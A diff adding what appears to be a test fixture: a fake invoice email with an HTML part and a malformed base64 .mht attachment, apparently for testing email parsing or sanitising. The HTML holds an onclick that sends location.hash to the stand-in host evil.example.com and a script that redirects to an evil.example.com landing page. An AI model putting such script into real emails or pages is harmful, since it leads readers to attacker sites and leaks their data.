@@ -1,0 +1,27 @@
+From: Billing <billing@example.com>
+To: victim@example.org
+Subject: Invoice 2026-11
+Date: Mon, 09 Nov 2026 09:00:00 +0000
+Message-ID: <invoice-2026-11@example.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="mix"
+
+--mix
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+<html><body><p>Your invoice is ready.</p>
+<img src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAA=3D">
+<a href=3D"https://evil.example.com/inv" onclick=3D"window.open('https://evil.example.com/inv?id=3D' + location.hash)">View invoice</a>
+<script>document.location =3D "https://evil.example.com/landing?src=3Demail";</script>
+</body></html>
+--mix
+Content-Type: application/octet-stream; name="saved.mht"
+Content-Disposition: attachment; filename="saved.mht"
+Content-Transfer-Encoding: base64
+
+dGhpcyBsaW5lIGlzIG5vdCBhIGhlYWRlcgo8aHRtbD4KCk1JTUUtVmVyc2lvbjogMS4wCkNvbnRl
+bnQtVHlwZTogbXVsdGlwYXJ0L3JlbGF0ZWQ7IGJvdW5kYXJ5PSJiIgoKLS1iCkNvbnRlbnQtVHlw
+ZTogdGV4dC9odG1sCgo8c2NyaXB0PmFsZXJ0KCdnYXJiYWdlIGZpcnN0Jyk8L3NjcmlwdD4KLS1i
+CkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKcGxhaW4gcGFydAotLWItLQo=
+--mix--
